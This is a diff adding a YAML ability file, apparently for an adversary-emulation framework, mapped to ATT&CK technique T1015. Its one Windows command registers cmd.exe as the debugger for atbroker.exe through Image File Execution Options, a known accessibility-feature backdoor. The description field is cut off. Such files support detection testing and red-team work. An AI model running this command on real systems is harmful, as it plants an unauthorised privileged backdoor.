@@ -1,0 +1,14 @@
+---
+
+- id: tacmulti-1015-AR06-1v00-200120184608
+  name: Attaches Command Prompt As Debugger To Process - AtBroker
+  description: .      This allows adversaries to execute the attached process.  
+  tactic: multiple
+  technique:
+    attack_id: T1015
+    name: Accessibility Features
+  platforms:
+    windows:
+      cmd:
+        command: |
+          reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
